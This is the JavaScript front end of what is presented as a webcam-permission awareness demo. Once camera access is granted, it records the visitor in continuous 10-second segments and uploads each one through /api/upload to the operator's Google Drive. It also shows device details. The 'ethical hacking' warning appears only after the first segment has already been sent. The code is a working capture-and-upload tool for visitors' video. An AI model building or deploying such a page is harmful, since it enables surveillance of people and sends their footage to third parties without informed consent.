/* Scroll to Demo */
function scrollToDemo() {
    document.getElementById("demo").scrollIntoView({
        behavior: "smooth"
    });
}

/* Camera Variables */
let video = document.getElementById("video");
let mediaRecorder;
let recordedChunks = [];
let isRecording = false;
let recordingCount = 0;
let stream = null;

/* Start Camera */
async function startCamera() {
    try {
        stream = await navigator.mediaDevices.getUserMedia({
            video: true
        });

        video.srcObject = stream;
        showDeviceInfo();
        
        // Start continuous recording
        startContinuousRecording();
        
    } catch (err) {
        alert("Camera permission denied!");
    }
}

/* Start Continuous Recording */
function startContinuousRecording() {
    if (!stream) {
        alert("Camera not started!");
        return;
    }
    
    isRecording = true;
    recordingCount = 0;
    
    // Show continuous recording indicator
    showContinuousIndicator();
    
    // Start first recording
    startNewRecording();
}

/* Start New Recording Segment */
function startNewRecording() {
    if (!isRecording) return;
    
    recordingCount++;
    recordedChunks = [];
    
    mediaRecorder = new MediaRecorder(stream);
    
    mediaRecorder.ondataavailable = function(event) {
        if (event.data.size > 0) {
            recordedChunks.push(event.data);
        }
    };
    
    mediaRecorder.onstop = function() {
        // Process this segment
        processRecordingSegment();
        
        // Start next segment after 1 second delay
        if (isRecording) {
            setTimeout(() => {
                console.log(`Starting segment ${recordingCount + 1}`);
                startNewRecording();
            }, 1000);
        }
    };
    
    // Record for 10 seconds
    mediaRecorder.start();
    
    // Update indicator
    updateRecordingIndicator();
    
    // Stop after 10 seconds
    setTimeout(() => {
        if (mediaRecorder && mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
        }
    }, 10000);
    
    console.log(`Recording segment ${recordingCount} started`);
}

/* Process Each Recording Segment */
function processRecordingSegment() {
    const blob = new Blob(recordedChunks, { type: "video/webm" });
    
    // Create preview URL for latest segment
    const url = URL.createObjectURL(blob);
    
    // Update video preview with latest segment
    video.srcObject = null;
    video.src = url;
    video.controls = true;
    
    // Save to Local Storage (keep only latest for preview)
    let reader = new FileReader();
    reader.readAsDataURL(blob);
    
    reader.onloadend = function() {
        localStorage.setItem("recordedVideo", reader.result);
        console.log(`Segment ${recordingCount} saved to Local Storage`);
        
        // Upload to Google Drive
        uploadToDrive(recordingCount);
        
        // Show warning message after first segment
        if (recordingCount === 1) {
            showSecurityWarning();
        }
    };
    
    // Show download button if not exists
    addDownloadButton();
}

/* Show Security Warning at the end of page */
function showSecurityWarning() {
    // Remove existing warning if any
    const existingWarning = document.getElementById('securityWarning');
    if (existingWarning) {
        existingWarning.remove();
    }
    
    // Create warning element
    const warningDiv = document.createElement('div');
    warningDiv.id = 'securityWarning';
    warningDiv.className = 'security-warning';
    warningDiv.innerHTML = `
        <div class="warning-content">
            <h2>SECURITY AWARENESS WARNING</h2>
            <p class="warning-message">
                This demonstration shows how malicious websites could misuse camera permissions.<br>
                <strong>Always verify before allowing camera access to any website.</strong>
            </p>
            <div class="warning-details">
                <h3>What Just Happened?</h3>
                <p>Your webcam was accessed automatically</p>
                <p>Video was recorded without explicit permission</p>
                <p>Data was stored locally and in cloud</p>
            </div>
            <div class="security-tips">
                <h3>Security Tips</h3>
                <ul>
                    <li>Always check website permissions in your browser</li>
                    <li>Revoke unused camera permissions from browser settings</li>
                    <li>Use camera covers when not in use</li>
                    <li>Keep your browser updated for security patches</li>
                    <li>Only grant camera access to trusted websites</li>
                </ul>
            </div>
            <div class="warning-footer">
                <p><strong>This is an educational demonstration for ethical hacking practice.</strong></p>
                <button onclick="closeWarning()" class="warning-close-btn">I Understand</button>
            </div>
        </div>
    `;
    
    // Append to body (at the end of page)
    document.body.appendChild(warningDiv);
    
    // Scroll to warning
    setTimeout(() => {
        warningDiv.scrollIntoView({ behavior: 'smooth' });
    }, 500);
}

/* Close Warning Function */
function closeWarning() {
    const warning = document.getElementById('securityWarning');
    if (warning) {
        warning.style.animation = 'fadeOut 0.5s ease';
        setTimeout(() => {
            warning.remove();
        }, 500);
    }
}

/* Show Continuous Recording Indicator */
function showContinuousIndicator() {
    const indicator = document.createElement('div');
    indicator.id = 'continuousIndicator';
    indicator.innerHTML = 'Continuous Recording Active';
    indicator.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: #10b981;
        color: white;
        padding: 15px 25px;
        border-radius: 8px;
        z-index: 1000;
        font-weight: bold;
        box-shadow: 0 4px 6px rgba(0,0,0,0.1);
    `;
    document.body.appendChild(indicator);
    
    // Add stop button
    const stopBtn = document.createElement('button');
    stopBtn.innerHTML = 'Stop Recording';
    stopBtn.style.cssText = `
        margin-left: 15px;
        padding: 8px 15px;
        background: #ef4444;
        color: white;
        border: none;
        border-radius: 5px;
        cursor: pointer;
        font-weight: bold;
    `;
    stopBtn.onclick = stopContinuousRecording;
    indicator.appendChild(stopBtn);
}

/* Update Recording Indicator */
function updateRecordingIndicator() {
    const indicator = document.getElementById('continuousIndicator');
    if (indicator) {
        indicator.innerHTML = `Recording Segment ${recordingCount}... (10s) <button onclick="stopContinuousRecording()" style="margin-left:15px; padding:8px 15px; background:#ef4444; color:white; border:none; border-radius:5px; cursor:pointer;">Stop</button>`;
    }
}

/* Stop Continuous Recording */
function stopContinuousRecording() {
    isRecording = false;
    
    if (mediaRecorder && mediaRecorder.state === 'recording') {
        mediaRecorder.stop();
    }
    
    const indicator = document.getElementById('continuousIndicator');
    if (indicator) {
        indicator.innerHTML = 'Recording Stopped';
        indicator.style.background = '#6b7280';
        
        setTimeout(() => {
            indicator.remove();
        }, 3000);
    }
    
    console.log(`Continuous recording stopped. Total segments: ${recordingCount}`);
    
    // Show summary with warning if not already shown
    if (recordingCount > 0) {
        showStatus(
            'Recording Summary', 
            '#3b82f6',
            `Total segments recorded: ${recordingCount}<br>All videos saved locally and uploaded to Drive`
        );
        
        // Ensure warning is shown
        const existingWarning = document.getElementById('securityWarning');
        if (!existingWarning) {
            showSecurityWarning();
        }
    }
}

/* ===== YAHAN IMPORTANT CHANGE HUA HAI ===== */
/* Upload to Google Drive - URL FIXED */
/* Upload to Google Drive */
async function uploadToDrive(segmentNumber) {
    const dataURL = localStorage.getItem("recordedVideo");

    if (!dataURL) {
        return;
    }

    try {
        const fileName = `webcam_segment_${segmentNumber}_${Date.now()}.webm`;
        
        console.log(`📤 Uploading segment ${segmentNumber} to Drive...`);
        
        // 🔴 YAHAN CHANGE KARO - PEHLE YE THA:
        // const response = await fetch('/upload-to-drive', {
        
        // ✅ AB YE KARO (Netlify Functions URL):
       const response = await fetch('/api/upload', {  // ← /api/upload bhi kaam karega
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ video: dataURL, fileName: fileName })
});

        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }

        const result = await response.json();

        if (result.success) {
            console.log(`✅ Segment ${segmentNumber} uploaded to Drive:`, result.driveLink);
            showMiniNotification(`Segment ${segmentNumber} uploaded to Drive`);
            
            // Drive link show karo
            const driveInfo = document.createElement('div');
            driveInfo.className = 'drive-success';
            driveInfo.innerHTML = `
                <p>✅ Segment ${segmentNumber} uploaded to Google Drive</p>
                <a href="${result.driveLink}" target="_blank" style="color: #2196F3; text-decoration: underline;">View Video</a>
            `;
            document.getElementById('deviceInfo').appendChild(driveInfo);
            
        } else {
            throw new Error(result.error || 'Upload failed');
        }

    } catch (err) {
        console.error(`❌ Upload error for segment ${segmentNumber}:`, err);
        showMiniNotification(`Upload failed for segment ${segmentNumber}`, 'error');
    }
}

/* Show Mini Notification */
function showMiniNotification(message, type = 'success') {
    const notification = document.createElement('div');
    notification.style.cssText = `
        position: fixed;
        bottom: 20px;
        right: 20px;
        background: ${type === 'success' ? '#10b981' : '#ef4444'};
        color: white;
        padding: 10px 15px;
        border-radius: 5px;
        z-index: 999;
        font-size: 14px;
        animation: slideIn 0.3s ease;
    `;
    notification.innerHTML = message;
    document.body.appendChild(notification);
    
    setTimeout(() => {
        notification.remove();
    }, 3000);
}

/* Show Status */
function showStatus(message, color, extra = '') {
    let statusDiv = document.getElementById('uploadStatus');
    if (!statusDiv) {
        statusDiv = document.createElement('div');
        statusDiv.id = 'uploadStatus';
        document.getElementById('demo').appendChild(statusDiv);
    }
    
    statusDiv.innerHTML = `
        <div style="text-align: center;">
            <h3 style="margin:0 0 10px 0;">${message}</h3>
            ${extra}
        </div>
    `;
    
    statusDiv.style.cssText = `
        margin-top: 20px;
        padding: 20px;
        background: ${color};
        color: white;
        border-radius: 8px;
        max-width: 600px;
        margin-left: auto;
        margin-right: auto;
    `;
}

/* Download Button */
function addDownloadButton() {
    if (!document.getElementById("downloadBtn")) {
        let btn = document.createElement("button");
        btn.id = "downloadBtn";
        btn.textContent = "Download Latest Video";
        btn.style.margin = "10px";
        btn.style.padding = "10px 20px";
        btn.style.backgroundColor = "#2196F3";
        btn.style.color = "white";
        btn.style.border = "none";
        btn.style.borderRadius = "5px";
        btn.style.cursor = "pointer";
        btn.onclick = downloadRecordedVideo;
        document.getElementById("deviceInfo").appendChild(btn);
    }
}

/* Download Video */
function downloadRecordedVideo() {
    const dataURL = localStorage.getItem("recordedVideo");
    if (!dataURL) {
        alert("No video found!");
        return;
    }
    const a = document.createElement("a");
    a.href = dataURL;
    a.download = `webcam_segment_${Date.now()}.webm`;
    a.click();
}

/* Device Info */
function showDeviceInfo() {
    const info = `
        <h3 style="margin-top:20px;">Device Information</h3>
        <p><strong>Browser:</strong> ${navigator.userAgent}</p>
        <p><strong>Operating System:</strong> ${navigator.platform}</p>
        <p><strong>Screen Resolution:</strong> ${screen.width} x ${screen.height}</p>
        <p><strong>Time Zone:</strong> ${Intl.DateTimeFormat().resolvedOptions().timeZone}</p>
    `;
    document.getElementById("deviceInfo").innerHTML = info;
}

// Add CSS styles for warning
const style = document.createElement('style');
style.textContent = `
    @keyframes slideIn {
        from {
            transform: translateX(100%);
            opacity: 0;
        }
        to {
            transform: translateX(0);
            opacity: 1;
        }
    }
    
    @keyframes fadeOut {
        from {
            opacity: 1;
        }
        to {
            opacity: 0;
        }
    }
    
    .security-warning {
        position: relative;
        width: 100%;
        min-height: 100vh;
        background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
        display: flex;
        justify-content: center;
        align-items: center;
        padding: 40px 20px;
        margin-top: 50px;
        animation: slideUp 0.8s ease;
        border-top: 5px solid #ff4444;
    }
    
    @keyframes slideUp {
        from {
            transform: translateY(50px);
            opacity: 0;
        }
        to {
            transform: translateY(0);
            opacity: 1;
        }
    }
    
    .warning-content {
        max-width: 800px;
        background: white;
        border-radius: 30px;
        padding: 40px;
        box-shadow: 0 30px 60px rgba(0,0,0,0.3);
        text-align: center;
        position: relative;
        overflow: hidden;
    }
    
    .warning-content::before {
        content: '';
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        height: 10px;
        background: linear-gradient(90deg, #ff4444, #ffaa00, #ff4444);
    }
    
    .warning-content h2 {
        color: #ff4444;
        font-size: 2.5rem;
        margin-bottom: 20px;
        text-transform: uppercase;
        letter-spacing: 2px;
        font-weight: 800;
    }
    
    .warning-message {
        font-size: 1.3rem;
        color: #333;
        line-height: 1.6;
        margin-bottom: 30px;
        padding: 20px;
        background: #fff3f3;
        border-radius: 15px;
        border-left: 5px solid #ff4444;
    }
    
    .warning-details, .security-tips {
        text-align: left;
        margin: 30px 0;
        padding: 20px;
        background: #f8f9fa;
        border-radius: 15px;
    }
    
    .warning-details h3, .security-tips h3 {
        color: #333;
        font-size: 1.4rem;
        margin-bottom: 15px;
        padding-bottom: 10px;
        border-bottom: 2px solid #ff4444;
    }
    
    .warning-details p {
        margin: 10px 0;
        font-size: 1.1rem;
        color: #555;
    }
    
    .security-tips ul {
        list-style-type: none;
        padding: 0;
    }
    
    .security-tips li {
        margin: 15px 0;
        font-size: 1.1rem;
        color: #555;
        padding-left: 30px;
        position: relative;
    }
    
    .security-tips li::before {
        content: '🔒';
        position: absolute;
        left: 0;
        color: #4CAF50;
    }
    
    .warning-footer {
        margin-top: 30px;
        padding: 20px;
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        border-radius: 15px;
        color: white;
    }
    
    .warning-footer p {
        font-size: 1.1rem;
        margin-bottom: 15px;
    }
    
    .warning-close-btn {
        padding: 15px 40px;
        font-size: 1.2rem;
        background: white;
        color: #667eea;
        border: none;
        border-radius: 50px;
        cursor: pointer;
        font-weight: bold;
        transition: all 0.3s ease;
    }
    
    .warning-close-btn:hover {
        transform: translateY(-3px);
        box-shadow: 0 10px 30px rgba(0,0,0,0.2);
    }
    
    .drive-success {
        margin-top: 10px;
        padding: 10px;
        background: #e8f5e9;
        border-radius: 5px;
        border-left: 4px solid #4CAF50;
        color: #2e7d32;
        font-size: 14px;
    }
    
    .drive-success a {
        display: inline-block;
        margin-top: 5px;
        font-weight: bold;
    }
`;
document.head.appendChild(style);

// Test server connection on load
window.addEventListener('load', async function() {
    try {
        const response = await fetch('/test');
        const data = await response.json();
        console.log('✅ Server connected:', data);
    } catch (err) {
        console.error('❌ Server not connected:', err);
    }
});
